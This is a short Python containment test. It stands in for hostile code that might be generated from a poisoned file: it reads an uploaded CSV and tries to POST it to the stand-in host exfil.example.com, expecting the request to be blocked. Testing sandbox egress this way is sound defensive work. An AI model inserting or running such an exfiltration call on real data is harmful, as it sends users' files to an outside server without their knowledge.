"""Containment demo: what code generated from a poisoned file might try.
Attempts to send the uploaded data to an outside server. Must fail."""
import urllib.request

data = open("/job/input.csv", "rb").read()
try:
    urllib.request.urlopen("http://exfil.example.com/collect", data=data, timeout=5)
    print("EGRESS SUCCEEDED - containment failed")
except Exception as e:  # noqa: BLE001
    print(f"egress attempt failed: {e}")
    raise
